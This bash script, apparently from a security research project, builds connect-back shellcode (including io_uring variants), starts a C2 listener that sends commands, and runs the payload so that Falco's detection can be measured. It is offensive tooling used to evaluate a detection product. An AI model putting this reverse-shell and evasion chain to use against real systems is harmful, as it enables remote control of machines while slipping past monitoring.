#!/bin/bash
# run_falco_poc.sh — falco-over-runner PoC for the connect_back chain
#
# Proven orchestration (three parties in parallel):
#   1. C2 listener on the HOST (:4444)  — plain python, sends `id`
#   2. falco in a privileged container  — modern_ebpf, --network host,
#      /proc,/sys,/etc mounted under /host (HOST_ROOT=/host)
#   3. target on the HOST via testing/runner (static build)
#
# The falco image has no nc/python3 and pure in-container orchestration
# cannot work; the listener must stay on the host.
#
# Usage: bash testing/run_falco_poc.sh <blob>      # e.g. /tmp/poc/cbsys.bin
#        bash testing/run_falco_poc.sh baseline|uring|recv
set -u
REPO_ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
OUT=/tmp/poc
mkdir -p "$OUT"

# ── blobs + static runner ─────────────────────────────────────────────
[ -f "$OUT/runner" ] || gcc -O0 -static -o "$OUT/runner" "$REPO_ROOT/testing/runner.c" || exit 1
case "${1:-baseline}" in
  baseline) nasm -f bin -o "$OUT/cbsys.bin"  "$REPO_ROOT/shellcode/connect_back_sys.asm" && BLOB=$OUT/cbsys.bin ;;
  uring)    python3 "$REPO_ROOT/builder/uring_builder.py" "$REPO_ROOT/builder/missions/connect_back.yaml" \
                --out "$OUT/cb_uring.bin" --quiet && BLOB=$OUT/cb_uring.bin ;;
  recv)     python3 "$REPO_ROOT/builder/uring_builder.py" "$REPO_ROOT/builder/missions/connect_back_recv.yaml" \
                --out "$OUT/cbr_uring.bin" --quiet && BLOB=$OUT/cbr_uring.bin ;;
  *) BLOB=$1 ;;
esac
[ -n "${BLOB:-}" ] || { echo "usage: $0 baseline|uring|recv|<blob.bin>"; exit 1; }
echo "[*] blob: $BLOB ($(wc -c <"$BLOB") bytes)"

# ── listener (host) ───────────────────────────────────────────────────
python3 "$REPO_ROOT/testing/c2_server.py" --port 4444 --timeout 25 &>/tmp/poc_listener.log &
L_PID=$!
trap 'kill $L_PID 2>/dev/null' EXIT
sleep 1
timeout 25 "$OUT/runner" "$BLOB" </dev/null >/dev/null 2>&1
echo "[*] runner exit: $?"
kill $L_PID 2>/dev/null
echo "=== listener: ==="; tail -4 /tmp/poc_listener.log

# ── falco capture ─────────────────────────────────────────────────────
# NOTE: falco must ALREADY be recording when the blob runs. Two-phase is
# easier to read for the paper:
#   terminal 1: docker run ... falco  (idle; see falco_reverse_sh_poc.yaml)
#   terminal 2: bash testing/run_falco_poc.sh baseline
# For an all-in-one capture use the inline recipe in
# testing/results/falco_edr_comparison.md ("Reproduction"),
# which starts falco inside the same container before running the target.
